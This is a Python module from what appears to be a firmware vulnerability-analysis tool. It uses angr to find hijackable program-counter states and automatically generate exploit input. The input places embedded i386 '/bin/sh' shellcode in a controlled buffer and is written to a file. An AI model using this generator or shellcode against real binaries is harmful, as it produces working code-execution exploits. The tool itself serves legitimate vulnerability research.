import angr
from angrutils import hook0, plot_cg, plot_cfg, set_plot_style, plot_cdg

from angr_helper.cfg_analyze import CFGAnalyze
from utils.db.mongodb.fw_file import FwFileDO
from utils.db.mongodb.fw_files_storage import FwFilesStorage
from utils.gadget.my_file import MyFile
from utils.gadget.my_path import MyPath
from utils.gadget.strutil import StrUtils
from angr_helper.angr_proj import AngrProj
from angr import sim_options as so

import os


class FwVulnerAnalyze:

    shellcode = bytes.fromhex("6a68682f2f2f73682f62696e89e331c96a0b5899cd80")
    def __init__(self, file_id):
        # 创建一个空 project 对象
        self.angr_proj = AngrProj(file_id, cfg_mode='None')
        project = self.angr_proj.proj
        if project is None:
            return

        self.file_id = file_id
        # shellcraft i386.linux.sh
        # self.shellcode = bytes.fromhex("6a68682f2f2f73682f62696e89e331c96a0b5899cd80")

    #  EIP 可控性分析
    #
    # solve.py 中使用 fully_symbolic() 方法检查 EIP 中符号变量的数量。
    # 其中 state.arch.bits 代表系统字长（The number of bits in a word），state.solver.symbolic() 用以判断输入数据是否为符号变量
    def fully_symbolic(state, variable):
        '''
        check if a symbolic variable is completely symbolic
        '''

        for i in range(state.arch.bits):
            if not state.solver.symbolic(variable[i]):
                return False

        return True

    # 3、约束条件构造
    # 对于 Exploit 自动生成问题来说，其关键是构造合适的约束条件，并利用 SMT(Satisfiability Modulo Theories) 约束求解器求解，若约束可解，则生成成功，否则生成失败。其中包括路径约束、EIP 约束、shellcode 约束等。
    def check_continuity(address, addresses, length):
        '''
        dumb way of checking if the region at 'address' contains 'length' amount of controlled
        memory.
        '''

        for i in range(length):
            if not address + i in addresses:
                return False

        return True

    # 内存布局分析
    #
    # 在触发控制流劫持后，需要分析当前状态下内存中符号变量的分布情况。
    # solve.py 中的 find_symbolic_buffer() 实现相关功能，主要包括查找符号输入、追踪符号变量两个部分。
    # (1) 查找符号输入
    # Angr 在处理 scanf 的输入数据时，采用 streams 模式。默认情况下，stdin、stdout、stderr 均采用该模式。state.posix.stdin 为输入程序的全部符号变量
    # (2) 追踪符号变量
    # 通过 state.solver.get_variables() 追踪内存中的符号变量
    #
    # 至此，已完成漏洞挖掘与崩溃现场的分析，后续需要结合 Exploit 的方式（ret2text、ret2syscall、ROP 等），构造完整的约束条件，并求解。
    def find_symbolic_buffer(state, length):
        '''
        dumb implementation of find_symbolic_buffer, looks for a buffer in memory under the user's
        control
        '''

        # get all the symbolic bytes from stdin
        stdin = state.posix.stdin

        sym_addrs = []
        for _, symbol in state.solver.get_variables('file', stdin.ident):
            sym_addrs.extend(state.memory.addrs_for_name(next(iter(symbol.variables))))

        for addr in sym_addrs:
            if FwVulnerAnalyze.check_continuity(addr, sym_addrs, length):
                yield addr

    def vuler_analyze(self):
        # es = self.angr_proj.proj.factory.entry_state()
        # sm = self.angr_proj.proj.factory.simulation_manager(es, save_unconstrained=True)
        #
        # while sm.active:
        #     sm.step()
        #     if sm.unconstrained:
        #         for un in sm.unconstrained:
        #             print("stdout:\n", un.posix.dumps(1))
        #             print("stdin:\n", un.posix.dumps(0), "\n")

        extras = {so.REVERSE_MEMORY_NAME_MAP, so.TRACK_ACTION_HISTORY}
        es = self.angr_proj.proj.factory.entry_state(add_options=extras)
        sm = self.angr_proj.proj.factory.simulation_manager(es, save_unconstrained=True)

        # find a bug giving us control of PC
        # l.info("looking for vulnerability in '%s'", binary_name)
        exploitable_state = None
        while exploitable_state is None:
            print(sm)
            sm.step()
            if len(sm.unconstrained) > 0:
                # l.info("found some unconstrained states, checking exploitability")
                for u in sm.unconstrained:
                    if FwVulnerAnalyze.fully_symbolic(u, u.regs.pc):
                        exploitable_state = u
                        break

                # no exploitable state found, drop them
                sm.drop(stash='unconstrained')

        # l.info("found a state which looks exploitable")
        ep = exploitable_state

        assert ep.solver.symbolic(ep.regs.pc), "PC must be symbolic at this point"

        # l.info("attempting to create exploit based off state")

        # keep checking if buffers can hold our shellcode
        for buf_addr in FwVulnerAnalyze.find_symbolic_buffer(ep, len(FwVulnerAnalyze.shellcode)):
            # l.info("found symbolic buffer at %#x", buf_addr)
            memory = ep.memory.load(buf_addr, len(FwVulnerAnalyze.shellcode))
            sc_bvv = ep.solver.BVV(FwVulnerAnalyze.shellcode)

            # check satisfiability of placing shellcode into the address
            if ep.satisfiable(extra_constraints=(memory == sc_bvv, ep.regs.pc == buf_addr)):
                # l.info("found buffer for shellcode, completing exploit")
                ep.add_constraints(memory == sc_bvv)
                # l.info("pointing pc towards shellcode buffer")
                ep.add_constraints(ep.regs.pc == buf_addr)
                break
        else:
            # l.warning("couldn't find a symbolic buffer for our shellcode! exiting...")
            return ""

        filename = '%s-exploit' % self.file_id
        with open(filename, 'wb') as f:
            f.write(ep.posix.dumps(0))

        res = 'find exploit in %s' % self.file_id
        print(res)
        # print("run with `(cat %s; cat -) | %s`" % (filename, binary))
        return res

